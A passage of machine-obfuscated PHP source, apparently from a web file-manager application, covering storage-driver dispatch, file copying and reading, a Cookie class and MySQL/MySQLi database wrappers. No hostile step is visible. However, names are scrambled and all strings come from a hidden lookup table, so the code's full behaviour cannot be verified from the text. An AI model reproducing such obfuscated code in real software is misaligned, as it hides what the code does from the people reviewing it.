$¸¶„É[$_SERVER[ŒÅŸ‹ä†][98]]); } public static function pathFather($æ³±ƒ›ª) { $¢÷ú…Ã = IO::init($æ³±ƒ›ª); $œÑ®¹¡ = $¢÷ú…Ã->pathFather($¢÷ú…Ã->path); return $¢÷ú…Ã->getPathOuter($œÑ®¹¡); } public static function fileOut($Ìõ´ÊÌ, $‰Ôã®Ñ¯ = false, $¿İ–¼Ş» = false, $ùÚÎÇ¡£ = '') { $›çˆË¼Í = self::driverMake($Ìõ´ÊÌ); if ($›çˆË¼Í->isFileOutServer()) { return $›çˆË¼Í->fileOutServer($Ìõ´ÊÌ, $‰Ôã®Ñ¯, $¿İ–¼Ş», $ùÚÎÇ¡£); } return $›çˆË¼Í->fileOut($Ìõ´ÊÌ, $‰Ôã®Ñ¯, $¿İ–¼Ş», $ùÚÎÇ¡£); } public static function fileOutImage($ËÙ²Çäô, $÷ôæ = 250) { $¯®Šß“ = array(250, 600, 1200, 2000, 3000, 5000); for ($Ğ½ôıİ” = 0; $Ğ½ôıİ” < count($¯®Šß“); $Ğ½ôıİ”++) { if ($Ğ½ôıİ” == 0 && $÷ôæ <= $¯®Šß“[$Ğ½ôıİ”]) { $÷ôæ = $¯®Šß“[$Ğ½ôıİ”]; break; } else { if ($÷ôæ > $¯®Šß“[$Ğ½ôıİ” - 1] && $÷ôæ <= $¯®Šß“[$Ğ½ôıİ”]) { $÷ôæ = $¯®Šß“[$Ğ½ôıİ”]; break; } else { if ($Ğ½ôıİ” == count($¯®Šß“) - 1 && $÷ôæ > $¯®Šß“[$Ğ½ôıİ”]) { $÷ôæ = $¯®Šß“[$Ğ½ôıİ”]; break; } } } } $õŒ—²İ = self::driverMake($ËÙ²Çäô); if ($õŒ—²İ->isFileOutServer()) { return $õŒ—²İ->fileOutImageServer($ËÙ²Çäô, $÷ôæ); } return $õŒ—²İ->fileOutImage($ËÙ²Çäô, $÷ôæ); } private static function driverIsSame($˜÷³¨•Å, $ÙÂ—ãÕë) { $ñÙ†Šê§ =& $_SERVER[ŒÅŸ‹ä†]; $‡åŸÛò = $˜÷³¨•Å->getType(); $¾Â®ÙŒ = $ÙÂ—ãÕë->getType(); if ($‡åŸÛò != $¾Â®ÙŒ) { return !1; } if ($‡åŸÛò == $ñÙ†Šê§[854]) { return !0; } if ($‡åŸÛò == $ñÙ†Šê§[117]) { return !0; } if ($˜÷³¨•Å->pathDriver == $ÙÂ—ãÕë->pathDriver) { return !0; } return !1; } public static function copyUpdate($…é·ıÒÊ, $Í±¹÷¯Ø) { $»øø™ôÑ =& $_SERVER[ŒÅŸ‹ä†]; if (!IO::exist($…é·ıÒÊ)) { return !1; } if (!IO::exist($Í±¹÷¯Ø)) { IO::mkdir($Í±¹÷¯Ø); } $¢ÓöƒòÏ = array_to_keyvalue(self::listAllSimple($…é·ıÒÊ), $»øø™ôÑ[97]); $«…Í£À€ = array_to_keyvalue(self::listAllSimple($Í±¹÷¯Ø), $»øø™ôÑ[97]); $ÆàÎŒŞ = array(); $š¢Õá†— = array(); foreach ($¢ÓöƒòÏ as $ĞøßİŠš => $£ïôÇñµ) { if (isset($«…Í£À€[$ĞøßİŠš])) { if ($£ïôÇñµ[$»øø™ôÑ[88]] == 1) { continue; } if ($«…Í£À€[$ĞøßİŠš][$»øø™ôÑ[89]] == $£ïôÇñµ[$»øø™ôÑ[89]]) { continue; } } if ($£ïôÇñµ[$»øø™ôÑ[88]] == 1) { $š¢Õá†—[] = $Í±¹÷¯Ø . $»øø™ôÑ[8] . trim($ĞøßİŠš, $»øø™ôÑ[8]); continue; } $³¤¼âÍ = strstr(trim($ĞøßİŠš, $»øø™ôÑ[8]), $»øø™ôÑ[8]) ? get_path_father($ĞøßİŠš) : $»øø™ôÑ[12]; $ÆàÎŒŞ[] = array($»øø™ôÑ[1287] => $£ïôÇñµ[$»øø™ôÑ[99]], $»øø™ôÑ[1288] => rtrim($Í±¹÷¯Ø, $»øø™ôÑ[8]) . $»øø™ôÑ[8] . $³¤¼âÍ, $»øø™ôÑ[1289] => $£ïôÇñµ); } $Ù¼ôÀøç = array($»øø™ôÑ[241] => $ÆàÎŒŞ, $»øø™ôÑ[88] => $š¢Õá†—); Hook::trigger($»øø™ôÑ[1290], $…é·ıÒÊ, $Í±¹÷¯Ø, $Ù¼ôÀøç); foreach ($š¢Õá†— as $£ïôÇñµ) { IO::mkdir($£ïôÇñµ); } foreach ($ÆàÎŒŞ as $£ïôÇñµ) { IO::copy($£ïôÇñµ[$»øø™ôÑ[1287]], $£ïôÇñµ[$»øø™ôÑ[1288]], REPEAT_REPLACE); } } public static function fileSubstr($Œ®¡ğ´‹, $ÕêÅÜ™Æ, $˜·ŸïàÙ = false) { $îÎËƒ§ =& $_SERVER[ŒÅŸ‹ä†]; $÷·Ÿ¬†Œ = self::driverMake($Œ®¡ğ´‹); $«Í¢¼°Ü = $÷·Ÿ¬†Œ->size($Œ®¡ğ´‹); $¹ª»š¥ = $ÕêÅÜ™Æ; $à¨Ö¬±º = $˜·ŸïàÙ; if ($ÕêÅÜ™Æ < 0) { $ÕêÅÜ™Æ = $«Í¢¼°Ü + $ÕêÅÜ™Æ; } if ($˜·ŸïàÙ === !1) { $˜·ŸïàÙ = $«Í¢¼°Ü - $ÕêÅÜ™Æ; } if ($ÕêÅÜ™Æ + $˜·ŸïàÙ > $«Í¢¼°Ü) { $˜·ŸïàÙ = $«Í¢¼°Ü - $ÕêÅÜ™Æ; } if (!$«Í¢¼°Ü && $÷·Ÿ¬†Œ->getType() == $îÎËƒ§[117] && !$÷·Ÿ¬†Œ->exist($Œ®¡ğ´‹)) { $İ«ğ•°‡ = get_path_this($Œ®¡ğ´‹); $èÛœ¶¦ = parse_url_query($İ«ğ•°‡); if (is_array($èÛœ¶¦) && isset($èÛœ¶¦[$îÎËƒ§[42]])) { $İ«ğ•°‡ = urldecode($èÛœ¶¦[$îÎËƒ§[42]]); } throw new Exception($îÎËƒ§[1291] . LNG($îÎËƒ§[1292]) . $îÎËƒ§[1077] . clear_html($İ«ğ•°‡) . $îÎËƒ§[12]); } if ($˜·ŸïàÙ <= 0) { return $îÎËƒ§[12]; } if ($ÕêÅÜ™Æ < 0 || $ÕêÅÜ™Æ >= $«Í¢¼°Ü || $˜·ŸïàÙ > $GLOBALS[$îÎËƒ§[6]][$îÎËƒ§[102]][$îÎËƒ§[1293]]) { throw new Exception("\146\x69\x6c\145\x52\145\x61\x64\x20\x65\x72\x72\x6f\162\54\157\x76\x65\162\40\x69\x6f\122\x65\x61\144\x4d\141\170\x21\x20\x73\164\x61\x72\x74\75{$ÕêÅÜ™Æ}\x3b\154\x65\x6e\x67\x74\150\75{$˜·ŸïàÙ}\x3b\x20\163\x69\x7a\x65\x3d{$«Í¢¼°Ü}\x3b"); } $ù ¸Ìığ = $÷·Ÿ¬†Œ->fileSubstr($Œ®¡ğ´‹, $ÕêÅÜ™Æ, $˜·ŸïàÙ); if (!$ù ¸Ìığ && $˜·ŸïàÙ && isset($GLOBALS[$îÎËƒ§[1294]])) { throw new Exception($GLOBALS[$îÎËƒ§[1294]][$îÎËƒ§[1295]]); } return $ù ¸Ìığ; } private static function driverMake(&$ó÷©™®„) { $Ğ–Å¹¹š =& $_SERVER[ŒÅŸ‹ä†]; $Ë³ÜÏŸ‰ = KodIO::parse($ó÷©™®„); if (!self::$driverListSystem) { $ş‹Ô»é = Model($Ğ–Å¹¹š[864])->driverListSystem(); self::$driverListSystem = array_to_keyvalue($ş‹Ô»é, $Ğ–Å¹¹š[492]); } if ($Ë³ÜÏŸ‰[$Ğ–Å¹¹š[43]] == KodIO::KOD_IO && !self::$driverListSystem[$Ë³ÜÏŸ‰[$Ğ–Å¹¹š[492]]]) { throw new Exception($Ğ–Å¹¹š[1296]); return !1; } $ó÷©™®„ = $Ë³ÜÏŸ‰[$Ğ–Å¹¹š[1297]]; $ä÷‰ËÕÀ = self::driverGet($Ë³ÜÏŸ‰, $ó÷©™®„); return $ä÷‰ËÕÀ; } private static function driverGet($˜À†¶ú, &$—æ°©) { $É©ííÈ¿ =& $_SERVER[ŒÅŸ‹ä†]; $±¥äŠÒ = $˜À†¶ú[$É©ííÈ¿[1298]]; $É†Ğ«¬» = $˜À†¶ú[$É©ííÈ¿[492]]; switch ($˜À†¶ú[$É©ííÈ¿[43]]) { case KodIO::KOD_IO: $‡àÎ¯øå = self::$driverListSystem[$É†Ğ«¬»]; break; case KodIO::KOD_SOURCE: $—æ°© = $É†Ğ«¬» . $—æ°©; $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1300], $É©ííÈ¿[6] => $˜À†¶ú); $‡àÎ¯øå[$É©ííÈ¿[6]][$É©ííÈ¿[1301]] = $˜À†¶ú[$É©ííÈ¿[492]]; break; case KodIO::KOD_USER_DRIVER: if (!self::$driverListUser) { $¡ø“âìÖ = $GLOBALS[$É©ííÈ¿[1302]]; self::$driverListUser = array_to_keyvalue($¡ø“âìÖ, $É©ííÈ¿[492]); } $‡àÎ¯øå = self::$driverListUser[$É†Ğ«¬»]; break; case KodIO::KOD_SHARE_LINK: $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1303], $É©ííÈ¿[6] => $˜À†¶ú); $ÛØùŞñÑ = Action($É©ííÈ¿[1304])->sharePathInfo($˜À†¶ú[$É©ííÈ¿[97]]); $—æ°© = $ÛØùŞñÑ[$É©ííÈ¿[202]]; if (!$ÛØùŞñÑ[$É©ííÈ¿[202]]) { $Åúìøãæ = Model($É©ííÈ¿[692])->getInfo($ÛØùŞñÑ[$É©ííÈ¿[693]]); $—æ°© = KodIO::clear($Åúìøãæ[$É©ííÈ¿[588]] . $˜À†¶ú[$É©ííÈ¿[1297]]); $˜À†¶ú[$É©ííÈ¿[581]] = $Åúìøãæ; $˜À†¶ú[$É©ííÈ¿[1278]] = $—æ°©; $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1305], $É©ííÈ¿[6] => $˜À†¶ú); } else { $‡àÎ¯øå[$É©ííÈ¿[6]][$É©ííÈ¿[1301]] = $ÛØùŞñÑ[$É©ííÈ¿[202]]; } break; case KodIO::KOD_SHARE_ITEM: $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1306], $É©ííÈ¿[6] => $˜À†¶ú); $Åúìøãæ = Model($É©ííÈ¿[692])->getInfo($˜À†¶ú[$É©ííÈ¿[492]]); if ($Åúìøãæ[$É©ííÈ¿[202]] == $É©ííÈ¿[239]) { $—æ°© = KodIO::clear($Åúìøãæ[$É©ííÈ¿[588]] . $˜À†¶ú[$É©ííÈ¿[1297]]); $˜À†¶ú[$É©ííÈ¿[581]] = $Åúìøãæ; $˜À†¶ú[$É©ííÈ¿[1278]] = $—æ°©; $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1307], $É©ííÈ¿[6] => $˜À†¶ú); } else { if (!$—æ°©) { $—æ°© = $Åúìøãæ[$É©ííÈ¿[202]]; } $‡àÎ¯øå[$É©ííÈ¿[6]][$É©ííÈ¿[1301]] = $Åúìøãæ[$É©ííÈ¿[202]]; } break; case KodIO::KOD_SHARE_OUTER: $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1308], $É©ííÈ¿[6] => $˜À†¶ú); break; default: $—æ°© = $˜À†¶ú[$É©ííÈ¿[97]]; $‡àÎ¯øå = array($É©ííÈ¿[1299] => $É©ííÈ¿[1309]); break; } $ …²ğÄ› = $˜À†¶ú[$É©ííÈ¿[97]]; if (!isset(self::$driverCache[$ …²ğÄ›])) { $é“Š„¶Ã = strtolower($‡àÎ¯øå[$É©ííÈ¿[106]]); $­ïİ¬½ñ = $GLOBALS[$É©ííÈ¿[6]][$É©ííÈ¿[102]][$É©ííÈ¿[930]]; $ª‘–“§… = $É©ííÈ¿[87] . (isset($­ïİ¬½ñ[$é“Š„¶Ã]) ? $­ïİ¬½ñ[$é“Š„¶Ã] : ucfirst($é“Š„¶Ã)); if (!class_exists($ª‘–“§…)) { show_json("{$ª‘–“§…}\40\156\x6f\164\40\x65\170\x69\163\164\163\41", !1); } $Ğ™ŒÙô° = isset($‡àÎ¯øå[$É©ííÈ¿[6]]) ? $‡àÎ¯øå[$É©ííÈ¿[6]] : !1; self::$driverCache[$ …²ğÄ›] = new $ª‘–“§…($Ğ™ŒÙô°); } $¿¬ğ¶í† = self::$driverCache[$ …²ğÄ›]; $¿¬ğ¶í†->pathDriver = $±¥äŠÒ; $¿¬ğ¶í†->pathBase = $É©ííÈ¿[12]; if (isset($‡àÎ¯øå[$É©ííÈ¿[6]][$É©ííÈ¿[1310]])) { $¿¬ğ¶í†->pathBase = rtrim($‡àÎ¯øå[$É©ííÈ¿[6]][$É©ííÈ¿[1310]], $É©ííÈ¿[8]) . $É©ííÈ¿[8]; $—æ°© = $¿¬ğ¶í†->pathBase . ltrim($—æ°©, $É©ííÈ¿[8]); } $—æ°© = $¿¬ğ¶í†->getPath($—æ°©); if (isset($˜À†¶ú[$É©ííÈ¿[1278]])) { $—æ°© = $˜À†¶ú[$É©ííÈ¿[1278]]; } $¿¬ğ¶í†->path = $—æ°©; return $¿¬ğ¶í†; } public static function errorTips($¶ä—¿• = false, $€ƒşˆ¨º = true) { $âÉª©™¹ =& $_SERVER[ŒÅŸ‹ä†]; static $¯ò©‘Øè = array(); $ˆİËÔíÊ = 100; if ($¶ä—¿• === -1) { return $¯ò©‘Øè ? $¯ò©‘Øè[count($¯ò©‘Øè) - 1] : $âÉª©™¹[12]; } if ($¶ä—¿• === !1) { return implode($âÉª©™¹[18], $¯ò©‘Øè); } if (count($¯ò©‘Øè) >= $ˆİËÔíÊ) { $¯ò©‘Øè = array_slice($¯ò©‘Øè, $ˆİËÔíÊ * 0.5, $ˆİËÔíÊ); } $¯ò©‘Øè[] = $¶ä—¿•; if (!$€ƒşˆ¨º) { return; } write_log($âÉª©™¹[184] . ACTION . $âÉª©™¹[1311] . $¶ä—¿•, $âÉª©™¹[1312]); } public static function getLastError($öõ°³Ş¼ = '') { $„Áíè•³ = self::errorTips(-1); return $„Áíè•³ ? $„Áíè•³ : $öõ°³Ş¼; } } goto A‰—ãĞôö¥; AÍ»ñ¶…Œ: class Cookie { private $prefix = ''; private $expire = 3600; public function __construct($ÉËĞ‹Ô« = '', $½Áñ‡»Î = 0) { if (is_string($ÉËĞ‹Ô«) && $ÉËĞ‹Ô« != $_SERVER[ŒÅŸ‹ä†][12]) { $this->prefix = $ÉËĞ‹Ô«; } if (is_numeric($½Áñ‡»Î) && $½Áñ‡»Î > 0) { $this->expire = $½Áñ‡»Î; } } public static function getInstance() { static $ı¼†úğÓ; if ($ı¼†úğÓ === null) { $ı¼†úğÓ = new self(); } return $ı¼†úğÓ; } private static $cookieDisable = false; public static function disable($Õ‘îı™) { self::$cookieDisable = $Õ‘îı™; } private static $sameCookieSet = array(); public static function set($£À…ÍàÜ, $Å§ŒÚ·, $ìÂóÜµ¹ = 0, $¬šï¹ù = false, $ÆÒÌ ª = false) { $àÀ€Á÷Ç =& $_SERVER[ŒÅŸ‹ä†]; if (self::$cookieDisable) { return; } if (!$ìÂóÜµ¹) { $ìÂóÜµ¹ = 24 * 3600 * 7; } if (isset(self::$sameCookieSet[$£À…ÍàÜ]) && self::$sameCookieSet[$£À…ÍàÜ] == $Å§ŒÚ· . $ìÂóÜµ¹) { return; } self::$sameCookieSet[$£À…ÍàÜ] = $Å§ŒÚ· . $ìÂóÜµ¹; if (!$ÆÒÌ ª) { $ÆÒÌ ª = str_replace(HOST, $àÀ€Á÷Ç[12], APP_HOST); $ÆÒÌ ª = _get($GLOBALS, $àÀ€Á÷Ç[991], $ÆÒÌ ª); } $ùÄÛõ = $àÀ€Á÷Ç[12]; setcookie($£À…ÍàÜ, $Å§ŒÚ·, time() + $ìÂóÜµ¹, $àÀ€Á÷Ç[8] . trim($ÆÒÌ ª, $àÀ€Á÷Ç[8]) . $ùÄÛõ, !1, !1, $¬šï¹ù); } public static function setSafe($ôğ¦£’, $£ÇíÈú, $©¼±â‹„ = 0) { self::set($ôğ¦£’, $£ÇíÈú, $©¼±â‹„, !0); } public static function get($¹æ§©‰Ë) { static $–ƒ–œš = false; if (!$–ƒ–œš) { self::initHeaderCookie(); $–ƒ–œš = !0; } return isset($_COOKIE[$¹æ§©‰Ë]) ? $_COOKIE[$¹æ§©‰Ë] : !1; } private static function initHeaderCookie() { $¶²ˆ¾Ç =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($_SERVER[$¶²ˆ¾Ç[992]]) || !$_SERVER[$¶²ˆ¾Ç[992]]) { return; } $ª‹šËŒ = explode($¶²ˆ¾Ç[84], $_SERVER[$¶²ˆ¾Ç[992]]); foreach ($ª‹šËŒ as $éİñ×§) { $éİñ×§ = explode($¶²ˆ¾Ç[473], $éİñ×§); if (count($éİñ×§) != 2 || !isset($éİñ×§[1])) { continue; } $_COOKIE[trim($éİñ×§[0])] = trim($éİñ×§[1]); } } public static function remove($«•èŠ„°, $Ä®­‹ø£ = false) { unset($_COOKIE[$«•èŠ„°]); self::set($«•èŠ„°, $_SERVER[ŒÅŸ‹ä†][12], 1, $Ä®­‹ø£); } } class DbMysql extends Db { public function __construct($éÃŒÂëà = '') { $¹˜é¡Ÿî =& $_SERVER[ŒÅŸ‹ä†]; if (!extension_loaded($¹˜é¡Ÿî[900])) { think_exception(think_lang($¹˜é¡Ÿî[24]) . $¹˜é¡Ÿî[993]); } if (!empty($éÃŒÂëà)) { $this->config = $éÃŒÂëà; if (empty($this->config[$¹˜é¡Ÿî[27]])) { $this->config[$¹˜é¡Ÿî[27]] = $¹˜é¡Ÿî[12]; } } } public function connect($Á¤œ½®ä = '', $¸·êñë« = 0, $Æà—î¼  = false) { $Ú˜ùÚ›‘ =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->linkID[$¸·êñë«])) { if (empty($Á¤œ½®ä)) { $Á¤œ½®ä = $this->config; } $Š¦¹ñ®¼ = $Á¤œ½®ä[$Ú˜ùÚ›‘[994]] . ($Á¤œ½®ä[$Ú˜ùÚ›‘[995]] ? "\x3a{$Á¤œ½®ä[$Ú˜ùÚ›‘[995]]}" : $Ú˜ùÚ›‘[12]); $áÀò¶ä = !empty($Á¤œ½®ä[$Ú˜ùÚ›‘[27]][$Ú˜ùÚ›‘[28]]) ? $Á¤œ½®ä[$Ú˜ùÚ›‘[27]][$Ú˜ùÚ›‘[28]] : $this->pconnect; if ($áÀò¶ä) { $this->linkID[$¸·êñë«] = mysql_pconnect($Š¦¹ñ®¼, $Á¤œ½®ä[$Ú˜ùÚ›‘[996]], $Á¤œ½®ä[$Ú˜ùÚ›‘[997]], 131072); } else { $this->linkID[$¸·êñë«] = mysql_connect($Š¦¹ñ®¼, $Á¤œ½®ä[$Ú˜ùÚ›‘[996]], $Á¤œ½®ä[$Ú˜ùÚ›‘[997]], !0, 131072); } if (!$this->linkID[$¸·êñë«] || !empty($Á¤œ½®ä[$Ú˜ùÚ›‘[31]]) && !mysql_select_db($Á¤œ½®ä[$Ú˜ùÚ›‘[31]], $this->linkID[$¸·êñë«])) { think_exception(mysql_error()); } $¼Ü£ôæŠ = mysql_get_server_info($this->linkID[$¸·êñë«]); mysql_query($Ú˜ùÚ›‘[998] . think_config($Ú˜ùÚ›‘[999]) . $Ú˜ùÚ›‘[68], $this->linkID[$¸·êñë«]); if ($¼Ü£ôæŠ > $Ú˜ùÚ›‘[1000]) { mysql_query($Ú˜ùÚ›‘[1001], $this->linkID[$¸·êñë«]); } $this->connected = !0; if (1 != think_config($Ú˜ùÚ›‘[32])) { unset($this->config); } } return $this->linkID[$¸·êñë«]; } public function free() { mysql_free_result($this->queryID); $this->queryID = null; } public function query($ô¶ó„í) { $Şî‹ûµÎ =& $_SERVER[ŒÅŸ‹ä†]; if (0 === stripos($ô¶ó„í, $Şî‹ûµÎ[352])) { $this->close(); $this->connected = !1; } $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $ô¶ó„í; if ($this->queryID) { $this->free(); } think_action_status($Şî‹ûµÎ[33], 1); think_status($Şî‹ûµÎ[34]); $this->queryID = mysql_query($ô¶ó„í, $this->_linkID); $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = mysql_num_rows($this->queryID); return $this->getAll(); } } public function execute($û˜§ò§µ) { $·ê›îó• =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!0); if (!$this->_linkID) { return !1; } $this->queryStr = $û˜§ò§µ; if ($this->queryID) { $this->free(); } think_action_status($·ê›îó•[35], 1); think_status($·ê›îó•[34]); $Ò‹ÌèÑÛ = mysql_query($û˜§ò§µ, $this->_linkID); $this->debug(); if (!1 === $Ò‹ÌèÑÛ) { $this->error(); return !1; } else { $this->numRows = mysql_affected_rows($this->_linkID); $this->lastInsID = mysql_insert_id($this->_linkID); return $this->numRows; } } public function startTrans() { $this->initConnect(!0); if (!$this->_linkID) { return !1; } if ($this->transTimes == 0) { mysql_query($_SERVER[ŒÅŸ‹ä†][1002], $this->_linkID); } $this->transTimes++; return; } public function commit() { if ($this->transTimes > 0) { $®·ÛÜ = mysql_query($_SERVER[ŒÅŸ‹ä†][1003], $this->_linkID); $this->transTimes = 0; if (!$®·ÛÜ) { $this->error(); return !1; } } return !0; } public function rollback() { if ($this->transTimes > 0) { $Üá£ÆÕ› = mysql_query($_SERVER[ŒÅŸ‹ä†][1004], $this->_linkID); $this->transTimes = 0; if (!$Üá£ÆÕ›) { $this->error(); return !1; } } return !0; } private function getAll() { $´û¨Õ¾Ğ = array(); if ($this->numRows > 0) { while ($½¡Ş«˜“ = mysql_fetch_assoc($this->queryID)) { $´û¨Õ¾Ğ[] = $½¡Ş«˜“; } mysql_data_seek($this->queryID, 0); } return $´û¨Õ¾Ğ; } public function getFields($Î«Ë´ş) { $¥’êÌ×¨ =& $_SERVER[ŒÅŸ‹ä†]; $°Õ›´óâ = $this->query($¥’êÌ×¨[1005] . $this->parseKey($Î«Ë´ş)); $ìÓà±Ü = array(); if ($°Õ›´óâ) { foreach ($°Õ›´óâ as $–©«áš => $¯Ô¡©â) { $ìÓà±Ü[$¯Ô¡©â[$¥’êÌ×¨[41]]] = array($¥’êÌ×¨[42] => $¯Ô¡©â[$¥’êÌ×¨[41]], $¥’êÌ×¨[43] => $¯Ô¡©â[$¥’êÌ×¨[44]], $¥’êÌ×¨[45] => (bool) (strtoupper($¯Ô¡©â[$¥’êÌ×¨[46]]) === $¥’êÌ×¨[1006]), $¥’êÌ×¨[47] => $¯Ô¡©â[$¥’êÌ×¨[48]], $¥’êÌ×¨[49] => strtolower($¯Ô¡©â[$¥’êÌ×¨[50]]) == $¥’êÌ×¨[51], $¥’êÌ×¨[52] => strtolower($¯Ô¡©â[$¥’êÌ×¨[53]]) == $¥’êÌ×¨[54]); } } return $ìÓà±Ü; } public function getTables($€ŠÛÎ = '') { $«›É¸“ä =& $_SERVER[ŒÅŸ‹ä†]; if (!empty($€ŠÛÎ)) { $ş‚Á„Ã˜ = $«›É¸“ä[1007] . $€ŠÛÎ . $«›É¸“ä[1008]; } else { $ş‚Á„Ã˜ = $«›É¸“ä[1009]; } $Ş‡¤éÖÂ = $this->query($ş‚Á„Ã˜); $™Ä ³åÚ = array(); foreach ($Ş‡¤éÖÂ as $…½ôßšĞ => $ĞÆ‘Ôû) { $™Ä ³åÚ[$…½ôßšĞ] = current($ĞÆ‘Ôû); } return $™Ä ³åÚ; } public function replace($ßª³ä¯œ, $ÍÑŞ®ç¾ = array()) { $Şò×ï°Ö =& $_SERVER[ŒÅŸ‹ä†]; foreach ($ßª³ä¯œ as $î·ë­Üš => $‰†öà—ù) { $¬Œ‰Ÿî = $this->parseValue($‰†öà—ù); if (is_scalar($¬Œ‰Ÿî)) { $âÈ³ä[] = $¬Œ‰Ÿî; $¯°Öì¥ô[] = $this->parseKey($î·ë­Üš); } } $÷¹ØïŒ» = $Şò×ï°Ö[1010] . $this->parseTable($ÍÑŞ®ç¾[$Şò×ï°Ö[367]]) . $Şò×ï°Ö[1011] . implode($Şò×ï°Ö[60], $¯°Öì¥ô) . $Şò×ï°Ö[1012] . implode($Şò×ï°Ö[60], $âÈ³ä) . $Şò×ï°Ö[1013]; return $this->execute($÷¹ØïŒ»); } public function insertAll($›øûôøÙ, $›Òú£ñ = array(), $¹à…ü‘û = false) { $æÛØÀí =& $_SERVER[ŒÅŸ‹ä†]; if (!is_array($›øûôøÙ[0])) { return !1; } $¿Ü¢„Úš = array_keys($›øûôøÙ[0]); $¥Åî¼»Ò = array(); foreach ($›øûôøÙ as $âÁÅ©øˆ) { $Ç¡‘‘Ñ’ = array(); foreach ($âÁÅ©øˆ as $ÒÙ¹ÚÚ… => $Ø—ƒ¹¿–) { $Ø—ƒ¹¿– = $this->parseValue($Ø—ƒ¹¿–); if (is_scalar($Ø—ƒ¹¿–)) { $Ç¡‘‘Ñ’[] = $Ø—ƒ¹¿–; } } $¥Åî¼»Ò[] = $æÛØÀí[347] . implode($æÛØÀí[60], $Ç¡‘‘Ñ’) . $æÛØÀí[1013]; } array_walk($¿Ü¢„Úš, array($this, $æÛØÀí[1014])); $âˆ²Íù = $¹à…ü‘û ? $æÛØÀí[1015] : $æÛØÀí[1016]; $âˆ²Íù = $æÛØÀí[1016]; $öÚ¸ûƒ¤ = $âˆ²Íù . $æÛØÀí[1017] . $this->parseTable($›Òú£ñ[$æÛØÀí[367]]) . $æÛØÀí[1011] . implode($æÛØÀí[60], $¿Ü¢„Úš) . $æÛØÀí[1018] . implode($æÛØÀí[60], $¥Åî¼»Ò); if ($¹à…ü‘û) { $Í–€ŒÚ = array(); foreach ($¿Ü¢„Úš as $ÒÙ¹ÚÚ…) { if ($ÒÙ¹ÚÚ… == $æÛØÀí[242] || $ÒÙ¹ÚÚ… == $æÛØÀí[1019]) { continue; } $Í–€ŒÚ[] = $ÒÙ¹ÚÚ… . $æÛØÀí[1020] . $ÒÙ¹ÚÚ… . $æÛØÀí[1013]; } $öÚ¸ûƒ¤ .= $æÛØÀí[1021] . implode($æÛØÀí[60], $Í–€ŒÚ); } return $this->execute($öÚ¸ûƒ¤); } public function close() { if ($this->_linkID) { mysql_close($this->_linkID); } $this->_linkID = null; } public function error() { $óŸ€ıÆ =& $_SERVER[ŒÅŸ‹ä†]; $this->error = mysql_errno() . $óŸ€ıÆ[4] . mysql_error($this->_linkID); if ($óŸ€ıÆ[12] != $this->queryStr) { $this->error .= LNG($óŸ€ıÆ[58]) . $this->queryStr; } think_trace($this->error, $óŸ€ıÆ[12], $óŸ€ıÆ[59]); return $this->error; } public function escapeString($ëô¶ô‹) { if ($this->_linkID) { return mysql_real_escape_string($ëô¶ô‹, $this->_linkID); } else { return mysql_escape_string($ëô¶ô‹); } } public function parseKey(&$•†ïÌ, $ëš„·²ò = true) { $˜Ò¬Û´ä =& $_SERVER[ŒÅŸ‹ä†]; if ($ëš„·²ò) { $•†ïÌ = $this->parseKeyCheck($•†ïÌ); } if ($•†ïÌ != $˜Ò¬Û´ä[231] && !preg_match($˜Ò¬Û´ä[1022], $•†ïÌ)) { $•†ïÌ = $˜Ò¬Û´ä[481] . trim($•†ïÌ, $˜Ò¬Û´ä[481]) . $˜Ò¬Û´ä[481]; } return $•†ïÌ; } } class DbMysqli extends Db { public function __construct($­›Úí™ = '') { $½¹âÃ =& $_SERVER[ŒÅŸ‹ä†]; if (!extension_loaded($½¹âÃ[1023])) { think_exception(think_lang($½¹âÃ[24]) . $½¹âÃ[1024]); } if (!empty($­›Úí™)) { $this->config = $­›Úí™; if (empty($this->config[$½¹âÃ[27]])) { $this->config[$½¹âÃ[27]] = $½¹âÃ[12]; } } } public function connect($¦ùêéÉİ = '', $ÅŞˆŒ‚å = 0) { $â·ÏÇÈò =& $_SERVER[ŒÅŸ‹ä†]; if (!isset($this->linkID[$ÅŞˆŒ‚å])) { if (empty($¦ùêéÉİ)) { $¦ùêéÉİ = $this->config; } $this->linkID[$ÅŞˆŒ‚å] = new mysqli($¦ùêéÉİ[$â·ÏÇÈò[994]], $¦ùêéÉİ[$â·ÏÇÈò[996]], $¦ùêéÉİ[$â·ÏÇÈò[997]], $¦ùêéÉİ[$â·ÏÇÈò[31]], $¦ùêéÉİ[$â·ÏÇÈò[995]] ? intval($¦ùêéÉİ[$â·ÏÇÈò[995]]) : 3306); if (mysqli_connect_errno()) { think_exception(mysqli_connect_error()); } $ÆÔ¾ÙÑö = $this->linkID[$ÅŞˆŒ‚å]->server_version; $this->linkID[$ÅŞˆŒ‚å]->query($â·ÏÇÈò[998] . think_config($â·ÏÇÈò[999]) . $â·ÏÇÈò[68]); if ($ÆÔ¾ÙÑö > $â·ÏÇÈò[1000]) { $this->linkID[$ÅŞˆŒ‚å]->query($â·ÏÇÈò[1001]); } $this->connected = !0; if (1 != think_config($â·ÏÇÈò[32])) { unset($this->config); } } return $this->linkID[$ÅŞˆŒ‚å]; } public function free() { $this->queryID->free_result(); $this->queryID = null; } public function query($Úå°î“é) { $Ò‘É±Û =& $_SERVER[ŒÅŸ‹ä†]; $this->initConnect(!1); if (!$this->_linkID) { return !1; } $this->queryStr = $Úå°î“é; if ($this->queryID) { $this->free(); } think_action_status($Ò‘É±Û[33], 1); think_status($Ò‘É±Û[34]); $this->queryID = $this->_linkID->query($Úå°î“é); if ($this->_linkID->more_results()) { while (($ÈÕ©Û‰Õ = $this->_linkID->next_result()) != NULL) { $ÈÕ©Û‰Õ->free_result(); } } $this->debug(); if (!1 === $this->queryID) { $this->error(); return !1; } else { $this->numRows = $this->queryID->num_rows; $this->numCols = $this->queryID->field_count; return $this->getAll(); } } public function execute($Ñ¸¸“Ğ) { 